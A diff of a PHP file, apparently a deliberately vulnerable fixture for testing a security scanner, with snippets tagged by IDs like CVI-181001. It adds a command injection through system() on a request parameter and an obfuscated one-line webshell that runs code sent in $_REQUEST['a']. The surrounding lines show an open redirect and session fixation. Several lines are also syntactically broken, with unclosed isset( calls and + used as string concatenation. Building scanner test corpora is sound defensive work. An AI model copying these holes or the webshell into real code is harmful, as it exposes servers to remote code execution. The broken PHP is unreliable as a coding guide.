@@ -16,6 +16,12 @@ if (isset($_GET['url']) {
     header("Location: ".$_GET["url"]);
 }
 
+# CVI-181001
+system('ls' + $_GET['directory']);
+
+# CVI-180001
+@array_map("ass\x65rt",(array)@$_REQUEST['a']);
+
 # CVI-230001
 if (isset($_GET['sid']) {
     setcookie("PHPSESSID", $_GET["sid"]);
